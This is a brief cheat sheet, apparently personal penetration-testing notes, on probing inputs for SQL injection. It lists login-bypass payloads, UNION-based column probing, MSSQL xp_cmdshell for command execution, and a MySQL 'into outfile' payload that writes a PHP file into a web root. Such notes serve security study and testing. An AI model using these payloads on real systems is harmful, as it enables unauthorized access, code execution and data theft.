#### <span style="color:#FFB86C">Probing inputs</span>
- When testing an input for SQLi (or anything), watch **how the response differs** for different inputs — look for behaviour/error/length changes that reveal the pattern.
- Fuzz with a special-characters wordlist:
```bash
/opt/seclists/fuzzing/special-chars.txt
```

- Try admin'# (valid username, see netsparker sqli cheatsheet)
- Try abcd' or 1=1;--
- Use UNION SELECT null,null,.. instead of 1,2,.. to avoid type conversion errors
#### <span style="color:#FFB86C">For mssql,</span>
- xp_cmdshell
- Use concat for listing 2 or more column data in one
#### <span style="color:#FFB86C">For mysql,</span>
- try a' or 1='1 -- -
- A' union select "" into outfile "C:\xampp\htdocs\run.php" -- -'
